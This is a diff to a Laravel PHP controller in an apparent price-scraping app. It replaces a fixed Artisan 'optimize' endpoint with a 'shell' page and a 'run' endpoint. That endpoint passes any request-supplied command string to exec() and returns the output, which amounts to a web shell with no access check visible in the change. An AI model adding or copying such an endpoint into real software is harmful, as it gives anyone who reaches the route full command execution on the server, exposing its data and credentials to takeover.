@@ -5,7 +5,6 @@ namespace App\Http\Controllers;
 use App\Services\PriceService;
 use App\Services\ScrapService;
 use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Artisan;
 
 class HomeController extends Controller
 {
@@ -20,13 +19,31 @@ class HomeController extends Controller
         ]);
     }
 
-    public function optimize(Request $request)
+    public function shell(Request $request)
     {
-        Artisan::call('app:optimize');
+        return view('home.shell', []);
+    }
+
+    public function run(Request $request)
+    {
+        $request->validate([
+            'command' => ['required', 'string', 'max:2000'],
+        ]);
+
+        $command = $request->input('command');
+
+        $output = [];
+        $resultCode = 0;
+
+        exec(
+            $command.' 2>&1',
+            $output,
+            $resultCode
+        );
 
         return response()->json([
-            'ok' => true,
-            'output' => Artisan::output(),
+            'resultCode' => $resultCode,
+            'output' => (array) $output,
         ]);
     }
 }
